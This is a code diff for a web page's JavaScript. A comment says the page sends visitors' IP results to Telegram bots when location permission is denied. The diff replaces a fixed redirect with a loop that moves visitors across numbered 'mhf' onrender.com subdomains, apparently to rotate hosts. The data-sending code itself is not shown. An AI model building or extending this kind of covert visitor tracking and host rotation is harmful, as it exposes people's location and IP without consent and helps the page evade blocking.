@@ -15,14 +15,23 @@
           // Location permission denied, send IP result to Telegram bots
         
 //////1//////
-        //  window.location.href = 'https://bigy10.onrender.com/'; 
+        // Get the current URL
+var currURL = window.location.href;
 
-if (window.location.href === 'https://bigy10.onrender.com/') {
-  window.location.href = 'https://bigy11.onrender.com/'; 
-}
-else
-{
-window.location.href = 'https://bigy9.onrender.com/'; 
+// Extract the current number from the URL
+var currNum = parseInt(currURL.match(/mhf(\d+)/)[1]);
+
+// Check if the current number is less than or equal to 99
+if (currNum <= 99) {
+  // Increment the current number by 1
+  var nextNum = currNum + 1;
+  // Replace the current number in the URL with the next number
+  var nextURL = currURL.replace(/mhf(\d+)/, 'mhf' + nextNum);
+  // Redirect to the next URL
+  window.location.href = nextURL;
+} else {
+  // If the current number is 100 or greater, redirect to the first URL
+  window.location.href = 'https://mhf1.onrender.com/';
 }
 
 //////1//////
